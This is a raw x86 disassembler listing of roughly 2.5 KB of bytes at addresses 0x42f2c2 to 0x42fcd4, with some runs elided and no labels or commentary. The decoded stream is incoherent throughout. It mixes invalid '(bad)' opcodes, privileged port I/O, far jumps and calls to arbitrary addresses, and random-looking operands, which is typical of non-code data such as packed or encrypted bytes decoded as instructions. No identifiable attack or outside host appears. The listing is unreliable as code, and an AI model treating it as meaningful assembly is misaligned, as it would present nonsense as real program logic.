  42f2c2:	dec    esi
  42f2c3:	and    eax,0x792773c1
  42f2c8:	cmp    al,BYTE PTR ds:0x150a8ac7
  42f2ce:	lds    esi,FWORD PTR [esi+0xe]
  42f2d1:	int    0x1c
  42f2d3:	mov    dh,0x26
  42f2d5:	or     al,0xb
  42f2d7:	sar    DWORD PTR [eax],1
  42f2d9:	xor    DWORD PTR [eax+0x68],eax
  42f2dc:	mov    al,ds:0xcdf6eb99
  42f2e1:	ds repz (bad) 
  42f2e4:	in     al,dx
  42f2e5:	cld    
  42f2e6:	xchg   ecx,eax
  42f2e7:	and    eax,0x5b8206f
  42f2ec:	or     BYTE PTR [ebx],dh
  42f2ee:	not    BYTE PTR [eax+0x4389aca9]
  42f2f4:	ficom  DWORD PTR [ebx+0x5c]
  42f2f7:	lahf   
  42f2f8:	push   ds
  42f2f9:	jp     0x42f348
  42f2fb:	outs   dx,BYTE PTR ds:[esi]
  42f2fc:	imul   ebp,edi,0x1f
  42f2ff:	lods   eax,DWORD PTR ds:[esi]
  42f300:	(bad)  
  42f301:	hlt    
  42f302:	jmp    0x621ae040
  42f307:	dec    ebp
  42f308:	inc    ecx
  42f309:	jno    0x42f367
  42f30b:	and    al,dl
  42f30d:	dec    BYTE PTR ds:0xb1c9
	...
  42f373:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	cmp    ah,BYTE PTR [esi-0x57439d1]
  42f386:	add    DWORD PTR [eax],eax
  42f388:	add    eax,0x63000001
  42f38d:	lods   eax,DWORD PTR ds:[esi]
  42f38e:	pop    ebp
  42f38f:	(bad)  
  42f390:	(bad)  
  42f392:	out    dx,eax
  42f393:	or     ecx,DWORD PTR [ecx-0x6]
  42f396:	mov    ah,0x8c
  42f398:	sbb    BYTE PTR [eax],0xc5
  42f39b:	push   ds
  42f39c:	xor    edi,DWORD PTR [ebp-0x72]
  42f39f:	icebp  
  42f3a0:	cld    
  42f3a1:	(bad)  
  42f3a2:	xor    eax,0x1c7ea041
  42f3a7:	into   
  42f3a8:	dec    edx
  42f3a9:	push   ebx
  42f3aa:	xor    al,0xb7
  42f3ac:	shl    BYTE PTR [ebx+0x20],1
  42f3af:	cwde   
  42f3b0:	fwait
  42f3b1:	adc    BYTE PTR [esi-0x5f],bl
  42f3b4:	mov    cl,0x56
  42f3b6:	cmp    eax,0xc265da14
  42f3bb:	pop    ds
  42f3bc:	gs inc ecx
  42f3be:	sahf   
  42f3bf:	in     al,dx
  42f3c0:	rcr    ecx,cl
  42f3c2:	scas   eax,DWORD PTR es:[edi]
  42f3c3:	int3   
  42f3c4:	les    ebx,FWORD PTR ds:0xd32a854
  42f3ca:	and    eax,0xeb53e3c7
  42f3cf:	inc    edi
  42f3d0:	test   al,0x5
  42f3d2:	mov    esi,0xf220d50f
  42f3d7:	pusha  
  42f3d8:	push   edi
  42f3d9:	and    DWORD PTR [ebp+eiz*1+0x4b],ecx
  42f3dd:	sbb    BYTE PTR [edx],cl
  42f3df:	xchg   esi,eax
  42f3e0:	out    dx,eax
  42f3e1:	and    eax,0x9a0689f5
  42f3e6:	pop    ebx
  42f3e7:	xlat   BYTE PTR ds:[ebx]
  42f3e8:	test   al,0xbc
  42f3ea:	fwait
  42f3eb:	sub    cl,BYTE PTR [ebx+edx*2]
  42f3ee:	xchg   ebp,eax
  42f3ef:	adc    eax,0x8295cc6c
  42f3f4:	mov    ebp,DWORD PTR [edx-0x5d]
  42f3f7:	mov    esp,0xef38bbd6
  42f3fc:	lock dec edi
  42f3fe:	mov    ds:0x5c720a4f,al
  42f403:	pushf  
  42f404:	xchg   esp,eax
  42f405:	push   ds
  42f406:	adc    bl,dl
  42f408:	jl     0x42f3c2
  42f40a:	(bad)  
  42f40b:	shr    esp,1
  42f40d:	jae    0x42f3d1
  42f40f:	out    dx,al
  42f410:	mov    edi,0xf1586c4d
  42f415:	jae    0x42f41a
  42f417:	dec    esp
  42f418:	sbb    cl,ah
  42f41a:	cmp    DWORD PTR [edx+ecx*1-0x1ebc0553],edi
  42f421:	add    eax,0x3431198a
  42f426:	pop    ebx
  42f427:	mov    ds:0x4986a299,eax
  42f42c:	lods   eax,DWORD PTR ds:[esi]
  42f42d:	(bad)  
  42f42e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f42f:	bound  edx,QWORD PTR [esp+ebx*1]
  42f432:	mov    esp,0x34c34ef4
  42f437:	adc    eax,0x6a075f0f
  42f43c:	inc    edi
  42f43d:	mov    ebx,0xe2a8171b
  42f442:	jmp    0x219b:0xad10ca24
  42f449:	imul   eax,DWORD PTR [eax+edi*4],0x9f6f4b99
  42f450:	mov    ecx,0x2512ff91
  42f455:	ds pop esp
  42f457:	xchg   ebx,eax
  42f458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f459:	aas    
  42f45a:	mov    es,ebp
  42f45c:	mov    eax,ds:0x792e5239
  42f461:	in     eax,dx
  42f462:	mov    al,0x91
  42f464:	push   ecx
  42f465:	xor    BYTE PTR [edx+edx*4],al
  42f468:	dec    esp
  42f469:	sub    ebx,DWORD PTR [edx+0x776c4b89]
  42f46f:	jl     0x42f488
  42f471:	sub    esi,DWORD PTR [esi+0x4e]
  42f474:	dec    ebx
  42f475:	in     eax,0x2b
  42f477:	xor    DWORD PTR [ebp+0xb],ebx
  42f47a:	cs sub al,0x94
  42f47d:	in     eax,0xb8
  42f47f:	lock jl 0x42f49e
  42f482:	xchg   BYTE PTR [esi+0x2],al
  42f485:	and    ch,BYTE PTR [ecx+0x4ce85534]
  42f48b:	mov    WORD PTR [ebp-0x20],fs
  42f48e:	mov    ch,BYTE PTR [edx+0x5f]
	...
  42f4f4:	aaa    
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	pop    edi
  42f501:	jne    0x42f524
  42f503:	pop    es
  42f504:	nop
  42f505:	sti    
  42f506:	add    DWORD PTR [eax],eax
  42f508:	add    eax,0x5a000001
  42f50d:	adc    DWORD PTR [edx+0x62ac5cd1],edi
  42f513:	clc    
  42f514:	or     DWORD PTR [eax],0x37
  42f517:	fcomp  DWORD PTR [edi]
  42f519:	push   es
  42f51a:	pop    eax
  42f51b:	aaa    
  42f51c:	xchg   esp,eax
  42f51d:	adc    al,0x9a
  42f51f:	and    al,0x51
  42f521:	ins    DWORD PTR es:[edi],dx
  42f522:	popa   
  42f523:	xor    ecx,esi
  42f525:	jp     0x42f539
  42f527:	arpl   di,bp
  42f529:	xor    BYTE PTR [ebp+eax*4-0x1e3f9991],al
  42f530:	sti    
  42f531:	cwde   
  42f532:	loope  0x42f53f
  42f534:	push   ecx
  42f535:	and    DWORD PTR [ebx],0xffffffc3
  42f538:	ja     0x42f589
  42f53a:	jo     0x42f55a
  42f53c:	aam    0xd0
  42f53e:	xchg   esp,eax
  42f53f:	push   ebx
  42f540:	inc    edi
  42f541:	out    0x5e,eax
  42f543:	arpl   WORD PTR [ebp+0x5d6380b4],ax
  42f549:	test   eax,0x74e01bce
  42f54e:	push   esp
  42f54f:	push   ds
  42f550:	pusha  
  42f551:	jge    0x42f557
  42f553:	mov    edi,0x83ed0fa2
  42f558:	xlat   BYTE PTR ds:[ebx]
  42f559:	xchg   edx,ecx
  42f55b:	xchg   edx,eax
  42f55c:	add    BYTE PTR [ecx-0x625f7a2b],dl
  42f562:	push   cs
  42f563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f564:	fisttp DWORD PTR [edi+0x18f2201b]
  42f56a:	not    BYTE PTR [eax-0xf]
  42f56d:	in     al,dx
  42f56e:	in     al,0x5e
  42f570:	imul   ecx,DWORD PTR [edx-0x2b7c54f1],0xffffffdb
  42f577:	(bad)  
  42f578:	call   0xf0aee493
  42f57d:	out    0x7a,al
  42f57f:	mov    ?,WORD PTR [ebx+eiz*4+0x3b7906cf]
  42f586:	enter  0xc9c8,0xbc
  42f58a:	aad    0x3
  42f58c:	dec    ebx
  42f58d:	js     0x42f566
  42f58f:	mov    WORD PTR [ebx+0x6d212006],cs
  42f595:	mov    BYTE PTR [edi],bh
  42f597:	mov    bl,0xcb
  42f599:	sub    eax,0xc3908cb7
  42f59e:	mov    ebx,0xe969a0fa
  42f5a3:	xchg   edi,eax
  42f5a4:	adc    eax,0x7e53f607
  42f5a9:	in     al,dx
  42f5aa:	imul   ebp,DWORD PTR [ebp+0x73],0xffffffe3
  42f5ae:	jle    0x42f533
  42f5b0:	mov    dl,0x2d
  42f5b2:	mov    dh,0x12
  42f5b4:	or     al,0x50
  42f5b6:	jge    0x42f637
  42f5b8:	jmp    0x42f60a
  42f5ba:	push   edi
  42f5bb:	test   al,0x33
  42f5bd:	out    dx,al
  42f5be:	jmp    0x42f5f1
  42f5c0:	mov    dh,0x56
  42f5c2:	mov    ebp,0x1de55dd8
  42f5c7:	adc    edi,DWORD PTR [edx+0x120dc8b9]
  42f5cd:	cmp    BYTE PTR [esi+ecx*2-0x3f9af72d],dh
  42f5d4:	test   al,0x8b
  42f5d6:	mov    BYTE PTR [esi-0x431b05f2],bh
  42f5dc:	dec    ecx
  42f5dd:	jae    0x42f61b
  42f5df:	pop    ds
  42f5e0:	pusha  
  42f5e1:	div    BYTE PTR [esp+eiz*8+0x4773b8e6]
  42f5e8:	in     eax,dx
  42f5e9:	sub    al,0xe7
  42f5eb:	cmp    bl,BYTE PTR ds:0x9b2645d9
  42f5f1:	sahf   
  42f5f2:	out    dx,al
  42f5f3:	outs   dx,BYTE PTR ds:[esi]
  42f5f4:	fwait
  42f5f5:	xor    al,0x1c
  42f5f7:	scas   al,BYTE PTR es:[edi]
  42f5f8:	jmp    0x42f605
  42f5fa:	and    al,0xb7
  42f5fc:	sub    BYTE PTR [edi],dl
  42f5fe:	repnz aas 
  42f600:	push   edx
  42f601:	shl    ebp,cl
  42f603:	gs sar dl,1
  42f606:	ret    0xbe03
  42f609:	inc    ebx
  42f60a:	lock ins BYTE PTR es:[edi],dx
  42f60c:	(bad)  
  42f60d:	push   ebx
  42f60e:	mov    ?,WORD PTR [edi+0x6e]
	...
  42f674:	ds push esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	loopne 0x42f64b
  42f682:	adc    al,0x9c
  42f684:	xchg   ebp,eax
  42f685:	cld    
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    eax,0xc2000001
  42f68d:	(bad)  
  42f68f:	ss loop 0x42f69f
  42f692:	push   0xea66c9b4
  42f697:	ins    BYTE PTR es:[edi],dx
  42f698:	sbb    al,0x26
  42f69a:	div    DWORD PTR [eax]
  42f69c:	inc    ecx
  42f69d:	bound  edx,QWORD PTR [esi-0x7a20f726]
  42f6a3:	imul   ecx,DWORD PTR [edx+0x65eb45e9],0xffffffb8
  42f6aa:	xor    DWORD PTR [esi-0x66],eax
  42f6ad:	arpl   WORD PTR [esp+edx*2+0x5a],dx
  42f6b1:	or     bh,BYTE PTR [ebx+0x198b92bf]
  42f6b7:	adc    al,0x81
  42f6b9:	gs lock pop edi
  42f6bc:	ror    DWORD PTR [edx+0x30],0xcf
  42f6c0:	shr    ebx,cl
  42f6c2:	sbb    BYTE PTR [ebp+0x6e],al
  42f6c5:	imul   ebp,DWORD PTR [esi+0x46],0xa5292fe9
  42f6cc:	in     al,dx
  42f6cd:	fimul  WORD PTR [eax]
  42f6cf:	in     eax,dx
  42f6d0:	dec    ebp
  42f6d1:	(bad)  
  42f6d2:	xor    BYTE PTR [eax-0x5c],bh
  42f6d5:	adc    cl,dl
  42f6d7:	push   ds
  42f6d8:	es push edi
  42f6da:	test   eax,0x6ecf3b22
  42f6df:	pop    edx
  42f6e0:	add    ecx,DWORD PTR [eax-0x48]
  42f6e3:	shr    DWORD PTR [ebp+0x5bbade8e],1
  42f6e9:	dec    eax
  42f6ea:	cli    
  42f6eb:	(bad)  
  42f6ec:	lods   eax,DWORD PTR ds:[esi]
  42f6ed:	mul    DWORD PTR [ecx-0x68]
  42f6f0:	dec    edx
  42f6f1:	int    0xeb
  42f6f3:	sar    BYTE PTR [edi-0xa],0x85
  42f6f7:	cmp    al,0x8d
  42f6f9:	dec    esp
  42f6fa:	jb     0x42f73d
  42f6fc:	enter  0x4880,0xfc
  42f700:	jo     0x42f68a
  42f702:	into   
  42f703:	(bad)  
  42f704:	fwait
  42f705:	ret    
  42f706:	adc    eax,0x3daf1a5e
  42f70b:	test   eax,0xed66cb28
  42f710:	scas   eax,DWORD PTR es:[edi]
  42f711:	test   BYTE PTR [esi+0x5d7f029f],al
  42f717:	sbb    eax,0x8535f58
  42f71c:	or     DWORD PTR [esi+0x3e7ed433],ebx
  42f722:	and    DWORD PTR [esi-0x75],edi
  42f725:	pop    ebx
  42f726:	xor    esi,DWORD PTR [eax]
  42f728:	std    
  42f729:	pop    eax
  42f72a:	js     0x42f6f6
  42f72c:	mov    ch,0x5a
  42f72e:	fcmovne st,st(4)
  42f730:	std    
  42f731:	fst    st(6)
  42f733:	in     eax,dx
  42f734:	xchg   edi,eax
  42f735:	loop   0x42f6f9
  42f737:	sbb    DWORD PTR [edx-0x513af650],esi
  42f73d:	pop    ss
  42f73e:	icebp  
  42f73f:	out    dx,al
  42f740:	mov    dh,0x61
  42f742:	jnp    0x42f77a
  42f744:	fisub  DWORD PTR [ecx+eax*8-0x16]
  42f748:	mov    esp,DWORD PTR [ebp-0x3d2494ae]
  42f74e:	xchg   esp,eax
  42f74f:	fidivr WORD PTR [ebp+ebx*8+0x26510da6]
  42f756:	lds    edx,FWORD PTR [esp+eax*4+0x65]
  42f75a:	ja     0x42f7b7
  42f75c:	jb     0x42f756
  42f75e:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f760:	jle    0x42f7c9
  42f762:	(bad)  
  42f764:	cmp    dl,ah
  42f766:	jmp    0x9493:0x961cec25
  42f76d:	push   edi
  42f76e:	or     eax,0xb2f6ca53
  42f773:	adc    DWORD PTR [esp+edi*4],0xffffffcc
  42f777:	pop    eax
  42f778:	(bad)  
  42f77a:	adc    eax,0x42e5706a
  42f77f:	lods   al,BYTE PTR ds:[esi]
  42f780:	test   BYTE PTR [edx-0x1888cb7d],cl
  42f786:	pop    ds
  42f787:	push   ds
  42f788:	xchg   edi,eax
  42f789:	pop    ecx
  42f78a:	imul   eax,DWORD PTR [ebx-0x33ac710e],0x34
	...
  42f7f1:	add    BYTE PTR [eax],al
  42f7f3:	add    BYTE PTR [ecx-0x5f],dh
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0xf0667e16
  42f804:	call   0x1:0x50001fd
  42f80b:	add    BYTE PTR [eax+eiz*2],ch
  42f80e:	jp     0x42f876
  42f810:	dec    esi
  42f811:	outs   dx,BYTE PTR ds:[esi]
  42f812:	and    al,BYTE PTR [ecx]
  42f814:	and    dl,bh
  42f816:	inc    esi
  42f817:	vpcmpgtb xmm5,xmm7,XMMWORD PTR [edi+0x57]
  42f81c:	sbb    eax,0xe832481c
  42f821:	inc    edi
  42f822:	jecxz  0x42f81b
  42f824:	das    
  42f825:	frstor ds:0x359178b5
  42f82b:	call   0x8166:0x252812f6
  42f832:	push   esp
  42f833:	lods   al,BYTE PTR ds:[esi]
  42f834:	fsub   QWORD PTR [ecx]
  42f836:	test   al,0xec
  42f838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f839:	arpl   WORD PTR [edi],dx
  42f83b:	pop    es
  42f83c:	mov    dh,BYTE PTR [eax-0x352925bf]
  42f842:	inc    edx
  42f843:	dec    ebx
  42f844:	popa   
  42f845:	cmp    DWORD PTR [ecx-0x35],edx
  42f848:	inc    ebp
  42f849:	ret    0x7491
  42f84c:	ja     0x42f8cb
  42f84e:	cli    
  42f84f:	mov    eax,ds:0xcdf4114a
  42f854:	iret   
  42f855:	clc    
  42f856:	arpl   WORD PTR [eax-0x5cf0d0f],sp
  42f85c:	jno    0x42f81f
  42f85e:	ret    
  42f85f:	jg     0x42f8d6
  42f861:	adc    al,0xc4
  42f863:	mov    cl,dh
  42f865:	jb     0x42f826
  42f867:	sbb    BYTE PTR [eax-0x2d15804],ch
  42f86d:	retf   0x8af2
  42f870:	or     eax,ebx
  42f872:	inc    ebx
  42f873:	cmp    ebx,esp
  42f875:	dec    ebp
  42f876:	(bad)  
  42f877:	mov    ebp,0x12660241
  42f87c:	test   al,0x7d
  42f87e:	pop    edx
  42f87f:	jae    0x42f892
  42f881:	or     ebx,esi
  42f883:	add    DWORD PTR [ebx],edx
  42f885:	icebp  
  42f886:	mov    esp,0xd2be337a
  42f88b:	in     eax,dx
  42f88c:	sbb    eax,0x6b9115ec
  42f891:	imul   esi,DWORD PTR [edi-0x58],0x3f
  42f895:	ret    0xf888
  42f898:	xchg   esp,eax
  42f899:	xor    dl,BYTE PTR [ebp+esi*1+0x31289c8d]
  42f8a0:	dec    edi
  42f8a1:	je     0x42f920
  42f8a3:	mov    ds:0xbb7545f4,eax
  42f8a8:	add    bh,BYTE PTR [eax]
  42f8aa:	je     0x42f881
  42f8ac:	in     eax,dx
  42f8ad:	js     0x42f86f
  42f8af:	xor    ecx,DWORD PTR [edx]
  42f8b1:	xchg   DWORD PTR [ebx+0x3b6547ad],ebx
  42f8b7:	(bad)  
  42f8b8:	ja     0x42f86a
  42f8ba:	ins    DWORD PTR es:[edi],dx
  42f8bb:	div    DWORD PTR [esi-0x5acc86c3]
  42f8c1:	lea    edi,[esi]
  42f8c3:	ret    0x90e6
  42f8c6:	sbb    al,0x6a
  42f8c8:	jbe    0x42f883
  42f8ca:	push   cs
  42f8cb:	pop    ecx
  42f8cc:	xchg   ebp,eax
  42f8cd:	ret    0x1d5
  42f8d0:	xor    al,0xd8
  42f8d2:	pop    ecx
  42f8d3:	into   
  42f8d4:	cmp    al,0x58
  42f8d6:	and    DWORD PTR [edi+0x4da3b51f],0x92c085b6
  42f8e0:	into   
  42f8e1:	xor    eax,0xa9fea13
  42f8e6:	mov    ebp,0x5e006ef5
  42f8eb:	cs inc esi
  42f8ed:	pop    ds
  42f8ee:	sbb    DWORD PTR [bp+0x2ef8],edi
  42f8f3:	jb     0x42f93c
  42f8f5:	dec    esi
  42f8f6:	xor    BYTE PTR [ebx+0x259d70c9],cl
  42f8fc:	neg    ebx
  42f8fe:	inc    eax
  42f8ff:	or     BYTE PTR [edi],ah
  42f901:	test   edx,0x485179c0
  42f907:	mov    ch,bh
  42f909:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  42f90b:	aas    
  42f90c:	jl     0x42f90a
  42f90e:	xchg   esi,eax
  42f90f:	push   cs
  42f910:	mov    dh,0x0
	...
  42f972:	add    BYTE PTR [eax],al
  42f974:	adc    al,0x74
  42f976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f977:	push   ebp
  42f978:	in     al,0xd5
  42f97a:	cmc    
  42f97b:	jne    0x42f928
  42f97d:	sbb    cl,dh
  42f97f:	js     0x42f981
  42f981:	sbb    DWORD PTR [esi-0x7],0xffffff9f
  42f985:	inc    BYTE PTR [ecx]
  42f987:	add    BYTE PTR ds:0xf5000001,al
  42f98d:	scas   al,BYTE PTR es:[edi]
  42f98e:	jbe    0x42f95c
  42f990:	arpl   WORD PTR [edi+0x27],bp
  42f993:	shl    edx,1
  42f995:	in     al,0xf0
  42f997:	mov    eax,0x73b8aa6e
  42f99c:	js     0x42f9fa
  42f99e:	and    ebp,DWORD PTR [eax+esi*4+0x5]
  42f9a2:	mov    ah,0x43
  42f9a4:	dec    ebp
  42f9a5:	pop    ss
  42f9a6:	adc    BYTE PTR [esi-0x527b5d91],0xf3
  42f9ad:	stc    
  42f9ae:	mov    eax,ebp
  42f9b0:	mov    dh,0xe9
  42f9b2:	and    edi,DWORD PTR [edx]
  42f9b4:	push   0xfd66f2f8
  42f9b9:	retf   0x73f1
  42f9bc:	sub    al,0x71
  42f9be:	in     al,0xd8
  42f9c0:	jle    0x42f975
  42f9c2:	cmp    eax,0x6d0e1d00
  42f9c7:	daa    
  42f9c8:	jg     0x42fa03
  42f9ca:	out    dx,eax
  42f9cb:	inc    esp
  42f9cc:	aam    0x70
  42f9ce:	adc    bh,BYTE PTR [edx+0x4d]
  42f9d1:	sub    cl,BYTE PTR [esi-0xb32f205]
  42f9d7:	cmc    
  42f9d8:	jnp    0x42f966
  42f9da:	es push es
  42f9dc:	in     al,0xfa
  42f9de:	ja     0x42f9ae
  42f9e0:	enter  0x276f,0x54
  42f9e4:	lahf   
  42f9e5:	cmp    eax,0xbd7a45b3
  42f9ea:	mov    esi,0x48f95449
  42f9ef:	pop    eax
  42f9f0:	ins    DWORD PTR es:[edi],dx
  42f9f1:	add    eax,0x6002750
  42f9f6:	mov    eax,ds:0x90f9138
  42f9fb:	or     edi,0xffffff8e
  42f9fe:	hlt    
  42f9ff:	popa   
  42fa00:	and    BYTE PTR [esi],bl
  42fa02:	ret    
  42fa03:	and    dl,BYTE PTR [esi]
  42fa05:	fcom   DWORD PTR [ebx-0x6e8012d1]
  42fa0b:	cmp    ebp,edx
  42fa0d:	and    DWORD PTR [edx],ebx
  42fa0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa10:	xor    eax,ebx
  42fa12:	cmp    eax,DWORD PTR [esi+0x4364a453]
  42fa18:	fs push edi
  42fa1a:	cmp    cl,BYTE PTR [edi+0x34]
  42fa1d:	ss ja  0x42f9e6
  42fa20:	std    
  42fa21:	and    eax,esp
  42fa23:	shr    BYTE PTR [ebp-0x553e54a5],1
  42fa29:	idiv   DWORD PTR [esi-0x2d]
  42fa2c:	xor    BYTE PTR [ebx+0x71],dl
  42fa2f:	jbe    0x42f9e3
  42fa31:	mov    bh,BYTE PTR [edi-0x1cba4261]
  42fa37:	add    cl,al
  42fa39:	inc    ebp
  42fa3a:	in     al,0x2
  42fa3c:	dec    ecx
  42fa3d:	in     al,dx
  42fa3e:	mov    dl,0x29
  42fa40:	dec    ebx
  42fa41:	sbb    al,0xa1
  42fa43:	in     eax,dx
  42fa44:	jl     0x42f9d6
  42fa46:	add    cl,BYTE PTR [edx+0x7b]
  42fa49:	cmp    ebp,esi
  42fa4b:	sti    
  42fa4c:	shr    DWORD PTR [esi-0x2b2e652c],1
  42fa52:	loopne 0x42fa4a
  42fa54:	mov    dl,0x23
  42fa56:	xchg   esp,eax
  42fa57:	mov    eax,esi
  42fa59:	lds    ebx,FWORD PTR [edx+0xd726fa8]
  42fa5f:	jo     0x42f9f1
  42fa61:	fist   DWORD PTR [edi-0x1c0c9dca]
  42fa67:	or     edx,ecx
  42fa69:	mov    esi,DWORD PTR [ecx]
  42fa6b:	int3   
  42fa6c:	dec    ebx
  42fa6d:	pop    ebx
  42fa6e:	iret   
  42fa6f:	xlat   BYTE PTR ds:[ebx]
  42fa70:	mov    ah,0xca
  42fa72:	add    DWORD PTR [ebx],ebp
  42fa74:	in     al,0xc8
  42fa76:	adc    al,0xb5
  42fa78:	push   es
  42fa79:	push   ss
  42fa7a:	ins    BYTE PTR es:[edi],dx
  42fa7b:	add    al,0x9e
  42fa7d:	test   BYTE PTR [eax+0x34e56390],bl
  42fa83:	adc    ch,BYTE PTR [edi+0x7435feae]
  42fa89:	scas   al,BYTE PTR es:[edi]
  42fa8a:	or     DWORD PTR [ebx],eax
  42fa8c:	sub    al,0x9b
  42fa8e:	loopne 0x42fa23
  42fa90:	push   edx
	...
  42faf1:	add    BYTE PTR [eax],al
  42faf3:	add    BYTE PTR [ebx],bl
  42faf5:	out    dx,eax
  42faf6:	shl    BYTE PTR [esi],0xf4
  42faf9:	aas    
  42fafa:	(bad)  
  42fafb:	out    dx,eax
  42fafc:	int3   
  42fafd:	mov    WORD PTR [edi+0x32],?
  42fb00:	rol    BYTE PTR [eax],cl
  42fb02:	enter  0xa4a3,0xff
  42fb06:	add    DWORD PTR [eax],eax
  42fb08:	add    eax,0xb4000001
  42fb0d:	adc    BYTE PTR [ecx+0x602a51ab],al
  42fb13:	jae    0x42fab1
  42fb15:	inc    esp
  42fb16:	or     BYTE PTR [edi+0x39],0xec
  42fb1a:	mov    ds:0x8d45c934,al
  42fb1f:	inc    eax
  42fb20:	das    
  42fb21:	imul   esp,DWORD PTR [edi-0x23],0xf5eb70d2
  42fb28:	(bad)  
  42fb29:	mov    eax,ds:0x394e79ac
  42fb2e:	push   0xffffffcf
  42fb30:	push   ecx
  42fb31:	xor    eax,0xe0965621
  42fb36:	(bad)  
  42fb37:	jbe    0x42fad4
  42fb39:	sbb    al,BYTE PTR [esi]
  42fb3b:	mov    WORD PTR [edi],ss
  42fb3d:	push   esp
  42fb3e:	fstp   DWORD PTR ds:0x8e113f9b
  42fb44:	mov    dl,0xd1
  42fb46:	pop    ebp
  42fb47:	test   BYTE PTR [edx+ebx*8+0x65],ah
  42fb4b:	sti    
  42fb4c:	lea    edx,[ebx+0x7ce6310e]
  42fb52:	xchg   ebp,eax
  42fb53:	inc    esp
  42fb54:	shl    DWORD PTR [ebx-0x21],0x12
  42fb58:	repnz gs mov bl,0xfb
  42fb5c:	dec    esp
  42fb5d:	cmp    edi,DWORD PTR [ebx]
  42fb5f:	cmp    bl,BYTE PTR [edx-0x3f]
  42fb62:	je     0x42fbd3
  42fb64:	lock mov ds:0x475734c,eax
  42fb6a:	aaa    
  42fb6b:	sti    
  42fb6c:	ror    BYTE PTR [edi],1
  42fb6e:	dec    eax
  42fb6f:	sub    edx,DWORD PTR ds:0x78dbf9fd
  42fb75:	push   ecx
  42fb76:	mov    WORD PTR [eax-0x55b1237c],?
  42fb7c:	and    WORD PTR [ebp+ebp*8+0x4fa6f027],si
  42fb84:	dec    edi
  42fb85:	clc    
  42fb86:	sub    BYTE PTR [eax+0x7ad9e205],al
  42fb8c:	cmp    BYTE PTR [esi+0x87b9572],0x8f
  42fb93:	mov    WORD PTR [edi+0x15],?
  42fb96:	mov    ebx,0xa06cc3eb
  42fb9b:	fisub  WORD PTR [esi-0x2c]
  42fb9e:	mov    dl,0x71
  42fba0:	ret    
  42fba1:	and    eax,0xa7d199aa
  42fba6:	pop    ebx
  42fba7:	arpl   WORD PTR [eax],bx
  42fba9:	push   edx
  42fbaa:	jno    0x42fbd6
  42fbac:	and    al,0xe8
  42fbae:	xor    al,0x80
  42fbb0:	fwait
  42fbb1:	mov    edx,0xcc0fdecd
  42fbb6:	ins    DWORD PTR es:[edi],dx
  42fbb7:	lahf   
  42fbb8:	in     al,0xe
  42fbba:	test   BYTE PTR [edx+0x5b],dh
  42fbbd:	cmc    
  42fbbe:	xor    ah,BYTE PTR [ebp-0x7ad1fda5]
  42fbc4:	div    DWORD PTR ds:0x798c0459
  42fbca:	ins    BYTE PTR es:[edi],dx
  42fbcb:	and    dl,bl
  42fbcd:	(bad)  
  42fbce:	mov    bl,0x6
  42fbd0:	add    DWORD PTR [eax],edx
  42fbd2:	adc    ebx,edi
  42fbd4:	and    edx,edi
  42fbd6:	or     eax,0x98075770
  42fbdb:	dec    ecx
  42fbdc:	mov    eax,edi
  42fbde:	mov    ebp,0xb86a0276
  42fbe3:	das    
  42fbe4:	ds add eax,0xbf44ae5b
  42fbea:	fidiv  WORD PTR [ebp+0x3adf4426]
  42fbf0:	addr16 fsubrp st(7),st
  42fbf3:	sar    DWORD PTR [edx+0x423fa07a],0xa0
  42fbfa:	inc    ebx
  42fbfb:	cmp    al,0xeb
  42fbfd:	push   eax
  42fbfe:	and    ebx,DWORD PTR [ebx+0x2f5b1cce]
  42fc04:	inc    esp
  42fc05:	loop   0x42fc43
  42fc07:	les    esp,FWORD PTR [eax+0x3c10222a]
  42fc0d:	xor    ah,al
  42fc0f:	sbb    ecx,eax
	...
  42fc71:	add    BYTE PTR [eax],al
  42fc73:	add    BYTE PTR [ebx],cl
  42fc75:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  42fc7b:	call   0x6b0:0x2036325e
  42fc82:	(bad)  
  42fc83:	mov    esi,0x200a9
  42fc88:	add    eax,0x29000001
  42fc8d:	xchg   esi,eax
  42fc8e:	stos   BYTE PTR es:[edi],al
  42fc8f:	outs   dx,DWORD PTR ds:[esi]
  42fc90:	adc    al,0x6f
  42fc92:	out    dx,eax
  42fc93:	pop    edx
  42fc94:	je     0x42fd02
  42fc96:	fwait
  42fc97:	and    eax,0x6cc5ac3c
  42fc9c:	sbb    al,0xbf
  42fc9e:	out    dx,al
  42fc9f:	data16 cmp al,BYTE PTR [edx-0x25]
  42fca3:	mov    WORD PTR [eax+0x69],?
  42fca6:	(bad)  
  42fca8:	add    BYTE PTR [ecx-0x2],bl
  42fcab:	mov    cl,0x66
  42fcad:	xchg   edi,eax
  42fcae:	or     cl,cl
  42fcb0:	inc    ecx
  42fcb1:	test   DWORD PTR [ebp+ebp*4-0x5e5825d],edi
  42fcb8:	imul   ebp,DWORD PTR [eax+0x60],0xac033b8
  42fcbf:	jp     0x42fd34
  42fcc1:	dec    ecx
  42fcc2:	mov    ds,WORD PTR [eax]
  42fcc4:	mov    ecx,0x3762d31
  42fcc9:	sbb    ebp,DWORD PTR [ebx]
  42fccb:	outs   dx,DWORD PTR ds:[esi]
  42fccc:	jo     0x42fcef
  42fcce:	push   ebp
  42fccf:	sti    
  42fcd0:	push   ebx
  42fcd1:	xor    bh,bh
  42fcd3:	push   eax
  42fcd4:	add    BYTE PTR [esp+ebx*1],dl
